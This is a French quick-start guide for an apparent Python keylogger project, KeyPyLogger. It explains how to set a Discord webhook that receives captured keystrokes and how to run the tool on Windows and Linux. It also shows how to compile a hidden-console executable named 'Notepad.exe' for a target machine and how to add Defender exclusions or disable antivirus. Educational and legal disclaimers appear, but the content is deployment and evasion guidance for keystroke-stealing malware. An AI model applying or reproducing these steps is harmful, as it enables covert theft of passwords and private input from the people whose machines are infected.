# 🚀 Guide de Démarrage Rapide - KeyPyLogger

## Installation en 3 étapes

### 1️⃣ Installer les dépendances

```bash
pip install -r requirements.txt
```

**Dépendances installées** :
- `pynput` ≥ 1.7.6
- `requests` ≥ 2.31.0
- `pyinstaller` ≥ 6.0.0 (optionnel, pour compilation)

---

### 2️⃣ Créer un Webhook Discord

1. **Ouvrir Discord** → Aller sur votre serveur de test
2. **Paramètres du serveur** → Intégrations → Webhooks
3. **Nouveau Webhook** → Nommer le webhook (ex: "KeyLogger-Test")
4. **Copier l'URL** → Format : `https://discord.com/api/webhooks/...`

---

### 3️⃣ Configurer et Exécuter

#### 🪟 Windows

```bash
# 1. Éditer le fichier
notepad src/windows/keylogger_windows.py

# 2. Remplacer la ligne 20 :
#    WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE"
#    par votre webhook Discord

# 3. Sauvegarder et exécuter
python src/windows/keylogger_windows.py
```

#### 🐧 Linux

```bash
# 1. Éditer le fichier
nano src/linux/keylogger_linux.py

# 2. Remplacer la ligne 20 :
#    WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE"
#    par votre webhook Discord

# 3. Sauvegarder et exécuter
python3 src/linux/keylogger_linux.py

# Si erreur de permission :
sudo python3 src/linux/keylogger_linux.py
```

---

## ✅ Test Rapide

### Tester la connexion webhook AVANT de lancer le keylogger

```bash
python tools/test_webhook.py
```

Ce script va :
1. Tester la connexion au webhook Discord
2. Envoyer un message de test
3. Tester le listener clavier
4. Vous confirmer que tout fonctionne

---

## 🎯 Première Utilisation

### Ce que vous allez voir

**Au démarrage** :
```
======================================================================
KeyPyLogger - Windows Version
======================================================================
WARNING: This tool is for EDUCATIONAL and AUTHORIZED testing only!
======================================================================

[*] Starting KeyPyLogger on Windows
[*] Logs will be sent every 60 seconds
[*] Press Ctrl+C to stop
```

**Sur Discord** (après 60 secondes ou quand le buffer est plein) :
- Message "🚀 KeyPyLogger Started" avec infos système
- Messages "🔑 Keylog Report" avec les frappes capturées

### Test simple

1. Lancez le keylogger
2. Tapez : `Hello World!`
3. Appuyez sur Enter
4. Attendez 60 secondes
5. Vérifiez Discord → vous devriez voir :
   ```
   Hello World!
   [ENTER]
   ```

---

## 🔨 Compilation Windows (Optionnel)

Pour créer un exécutable Windows standalone :

```bash
# Lancer le compilateur
python tools/compile_windows.py

# Suivre les instructions :
# - Option 1 : Console cachée (production)
# - Option 2 : Console visible (debug)
# - Nom : Notepad (ou autre)

# L'exécutable sera dans :
build/dist/Notepad.exe
```

**Avantages** :
- ✅ Pas besoin de Python sur la machine cible
- ✅ Un seul fichier .exe
- ✅ Plus discret (pas de console visible)

**Inconvénient** :
- ❌ Détection possible par les antivirus

---

## ⚙️ Configuration Personnalisée

Dans le fichier source, vous pouvez modifier :

```python
WEBHOOK_URL = "..."        # Votre webhook Discord
SEND_INTERVAL = 60         # Envoyer toutes les 60 secondes
MAX_BUFFER_SIZE = 1000     # Taille max avant envoi forcé
```

### Exemples

**Envoi rapide (toutes les 10 secondes)** :
```python
SEND_INTERVAL = 10
```

**Envoi lent (toutes les 5 minutes)** :
```python
SEND_INTERVAL = 300  # 300 secondes = 5 minutes
```

**Buffer plus petit (envoi plus fréquent)** :
```python
MAX_BUFFER_SIZE = 500  # Envoie dès 500 caractères
```

---

## 🐛 Dépannage Rapide

### ❌ "ModuleNotFoundError: No module named 'pynput'"

```bash
pip install pynput requests
```

### ❌ "Permission denied" (Linux)

```bash
# Solution 1 : Ajouter au groupe input
sudo usermod -a -G input $USER
# Puis déconnexion/reconnexion

# Solution 2 : Utiliser sudo
sudo python3 src/linux/keylogger_linux.py
```

### ❌ Rien n'arrive sur Discord

1. Vérifier l'URL du webhook (doit commencer par `https://discord.com/api/webhooks/`)
2. Vérifier la connexion Internet
3. Tester avec `tools/test_webhook.py`
4. Attendre au moins 60 secondes ou taper 1000 caractères

### ❌ L'antivirus supprime l'exécutable

```powershell
# Windows : Ajouter une exception dans Windows Defender
# 1. Windows Security → Virus & threat protection
# 2. Manage settings → Exclusions → Add or remove exclusions
# 3. Ajouter le dossier KeyPyLogger

# Ou utiliser le script Python au lieu de l'exécutable
python src/windows/keylogger_windows.py
```

---

## 📊 Comparaison : Script vs Exécutable

| Caractéristique | Script Python | Exécutable (.exe) |
|----------------|---------------|-------------------|
| **Python requis** | ✅ Oui | ❌ Non |
| **Taille** | < 10 KB | ~15 MB |
| **Démarrage** | Rapide | Plus lent |
| **Détection AV** | Faible | Élevée |
| **Debug** | Facile | Difficile |
| **Portable** | Non | Oui |

**Recommandation** :
- 🧪 **Tests/Développement** : Utilisez le script Python
- 🎯 **Déploiement** : Utilisez l'exécutable

---

## ⚠️ Rappels Importants

### Légal
- ✅ Uniquement sur VOS machines ou avec autorisation ÉCRITE
- ✅ Contexte éducatif, CTF, lab de sécurité
- ❌ JAMAIS sur des machines de tiers sans permission
- ❌ JAMAIS pour espionner ou nuire

### Sécurité
- 🔒 Gardez votre webhook Discord PRIVÉ
- 🔒 Ne partagez JAMAIS un keylogger configuré
- 🔒 Testez dans une VM isolée si possible
- 🔒 Supprimez les logs Discord après vos tests

### Bonnes Pratiques
1. Créer un serveur Discord dédié aux tests
2. Utiliser un webhook unique par test
3. Supprimer le webhook après utilisation
4. Documenter vos tests (date, machine, objectif)
5. Ne jamais laisser tourner sans surveillance

---

## 🎓 Prochaines Étapes

Après le démarrage rapide :

1. **Lire la documentation complète** : [docs/USAGE.md](docs/USAGE.md)
2. **Explorer les options avancées** : [docs/FAQ.md](docs/FAQ.md)
3. **Apprendre la détection** : Comment repérer un keylogger ?
4. **Étudier les contre-mesures** : Comment se protéger ?

---

## 💡 Conseils pour les Tests

### Test en VM (Recommandé)

```bash
# 1. Créer une VM Windows/Linux
# 2. Installer KeyPyLogger
# 3. Configurer le webhook
# 4. Tester
# 5. Détruire la VM ou restaurer un snapshot
```

### Test sur Machine Physique

```bash
# 1. Créer un point de restauration système
# 2. Désactiver temporairement l'antivirus
# 3. Tester le keylogger
# 4. Arrêter et nettoyer
# 5. Réactiver l'antivirus
```

---

## 📞 Besoin d'Aide ?

- 📖 **Documentation** : Voir [README.md](README.md)
- ❓ **FAQ** : Voir [docs/FAQ.md](docs/FAQ.md)
- 🐛 **Bug** : Ouvrir une [issue GitHub](https://github.com/Nyx-Off/KeyPyLogger/issues)
- 💬 **Discussion** : [GitHub Discussions](https://github.com/Nyx-Off/KeyPyLogger/discussions)

---

<div align="center">

**Bon apprentissage ! 🎓**

*N'oubliez pas : Toujours utiliser de manière éthique et légale*

</div>
